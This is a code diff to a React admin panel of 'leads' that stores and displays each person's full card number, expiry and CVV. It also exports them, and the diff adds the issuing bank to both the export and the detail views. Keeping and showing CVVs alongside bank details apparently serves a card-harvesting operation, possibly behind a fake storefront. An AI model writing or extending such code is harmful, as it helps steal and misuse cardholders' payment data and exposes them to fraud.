@@ -26,6 +26,7 @@ interface Lead {
   cardNumber: string;
   cardExpiry: string;
   cardCvv: string;
+  cardBank: string | null;
   installments: string;
   notes: string | null;
   itemsJson: string;
@@ -264,6 +265,7 @@ export default function LeadsPanelPage() {
       "Forma de Pagamento",
       "Parcelas",
       "Numero do Cartao",
+      "Banco / Instituicao",
       "Subtotal",
       "Desconto",
       "Total",
@@ -291,6 +293,7 @@ export default function LeadsPanelPage() {
         isPix ? "PIX (WhatsApp)" : "Cartão",
         isPix ? "-" : lead.installments,
         cartao,
+        lead.cardBank ?? "-",
         (lead.subtotalCents / 100).toFixed(2).replace(".", ","),
         (lead.discountCents / 100).toFixed(2).replace(".", ","),
         (lead.totalCents / 100).toFixed(2).replace(".", ","),
@@ -648,6 +651,7 @@ export default function LeadsPanelPage() {
                     <Field label="Bairro" value={lead.neighborhood} />
                     <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                     <Field label="Cartão" value={lead.cardNumber} />
+                    <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
                     <Field
                       label="Validade / CVV"
                       value={`${lead.cardExpiry} · ${lead.cardCvv}`}
@@ -1029,6 +1033,7 @@ export default function LeadsPanelPage() {
                       <Field label="Bairro" value={lead.neighborhood} />
                       <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                       <Field label="Cartão" value={lead.cardNumber} />
+                      <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
                       <Field label="Forma de pagamento" value="Cartão" />
                     </div>
 
